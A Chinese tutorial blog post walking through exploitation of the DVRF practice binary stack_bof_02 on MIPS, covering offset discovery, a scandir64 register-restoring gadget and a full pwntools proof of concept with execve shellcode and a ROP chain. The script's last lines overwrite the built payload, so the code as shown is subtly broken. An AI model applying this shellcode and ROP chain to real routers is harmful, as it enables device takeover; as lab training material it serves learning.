---
title: 一步一步pwn路由器之rop技术实战
authorId: hac425
tags:
  - mips rop
  - 栈溢出
categories:
  - 路由器安全
date: 2017-10-28 11:47:00
---
### 前言


---
本文由 **本人** 首发于 先知安全技术社区：  https://xianzhi.aliyun.com/forum/user/5274/

---

这次程序也是 DVRF 里面的，他的路径是 `pwnable/ShellCode_Required/stack_bof_02` , 同样是一个简单的栈溢出，不过这个程序里面没有提供 `getshell` 的函数，需要我们执行shellcode来实现。这个正好实战下前文: [一步一步pwn路由器之路由器环境修复&&rop技术分析](https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html),中分析的在mips下的通用的rop技术。

### 正文
首先使用 `qemu` 运行目标程序，并等待 `gdb` 来调试。
```
sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/ShellCode_Required/stack_bof_02  "`cat ./pwnable/Intro/input`"
```

使用pwntools的 cyclic 功能，找到偏移
![paste image](http://oy9h5q2k4.bkt.clouddn.com/15091628511130mev14fe.png?imageslim)
验证一下：
```
payload = "A" * 508 + 'B' * 4

with open("input", "wb") as f:
    f.write(payload)
```
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509163815793mv4b39p0.png?imageslim)
OK, 现在我们已经可以控制程序的 `$pc`寄存器了，下一步就是利用的方法了。使用前文的那个 rop 链，我们需要可以控制 `$s1`寄存器。但是这里我们并没有办法控制。不过在 [这里](https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-MIPS-rop-gadgets%E8%AE%B0%E5%BD%95%E8%B4%B4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html)提到，在 `uclibc` 的 `scandir` 或者 `scandir64` 的函数末尾有一个` gadgets` 可以操控几乎所有寄存器。

```
.text:0000AFE0                 lw      $ra, 0x40+var_4($sp)
.text:0000AFE4                 lw      $fp, 0x40+var_8($sp)
.text:0000AFE8                 lw      $s7, 0x40+var_C($sp)
.text:0000AFEC                 lw      $s6, 0x40+var_10($sp)
.text:0000AFF0                 lw      $s5, 0x40+var_14($sp)
.text:0000AFF4                 lw      $s4, 0x40+var_18($sp)
.text:0000AFF8                 lw      $s3, 0x40+var_1C($sp)
.text:0000AFFC                 lw      $s2, 0x40+var_20($sp)
.text:0000B000                 lw      $s1, 0x40+var_24($sp)
.text:0000B004                 lw      $s0, 0x40+var_28($sp)
.text:0000B008                 jr      $ra
.text:0000B00C                 addiu   $sp, 0x40
.text:0000B00C  # End of function scandir64
```

于是利用的思路就很明确了。首先使用这段 `rop gadgets` 设置好寄存器，然后进入前文所说的 `rop` 链中执行。
最后的poc如下：
```
#!/usr/bin/python
from pwn import *
context.endian = "little"
context.arch = "mips"

payload = ""

# NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
for i in range(30):
    payload += "\x26\x40\x08\x01"

# execve shellcode translated from MIPS to MIPSEL
# http://shell-storm.org/shellcode/files/shellcode-792.php
payload += "\xff\xff\x06\x28"  # slti $a2, $zero, -1
payload += "\x62\x69\x0f\x3c"  # lui $t7, 0x6962
payload += "\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
payload += "\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
payload += "\x73\x68\x0e\x3c"  # lui $t6, 0x6873
payload += "\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
payload += "\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
payload += "\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
payload += "\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
payload += "\xff\xff\x05\x28"  # slti $a1, $zero, -1
payload += "\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
payload += "\x0c\x01\x01\x01"  # syscall 0x40404
shellcode = payload


padding = "O" * 508
payload = padding
payload += p32(0x766effe0)
payload += 'B' * 0x18
payload += 'A' * 4  # $s0
payload += p32(0x7670303c)  # $s1
payload += 'A' * 4  # $s2
payload += 'A' * 4  # $s3
payload += 'A' * 4  # $s4
payload += 'A' * 4  # $s5
payload += 'A' * 4  # $s6
payload += 'A' * 4  # $s7
payload += 'A' * 4  # $fp
payload += p32(0x76714b10)  # $ra for jmp

# stack for gadget 2
payload += 'B' * 0x18
payload += 'A' * 4  # $s0
payload += p32(0x0002F2B0 + 0x766e5000)  # $s1
payload += 'A' * 4  # $s2
payload += p32(0x766fbdd0)  # $ra


# stack for gadget 2 for second
payload += 'B' * 0x18
payload += p32(0x767064a0)  # $s0  for jmp stack
payload += p32(0x0002F2B0 + 0x766e5000)  # $s1
payload += 'A' * 4  # $s2
payload += p32(0x766fbdd0)  # $ra for get stack addr

# stack for shellcode
payload += shellcode

payload = "A" * 508 + 'B' * 4

with open("input", "wb") as f:
    f.write(payload)


# base 0x766e5000

```
可以执行完毕 `shellcode` , 不过执行完后就异常了。神奇。
### 总结
在调试rop时可以先在调试器中修改寄存器，内存数据来模拟实现，然后在写到脚本里面。

参考链接：

https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/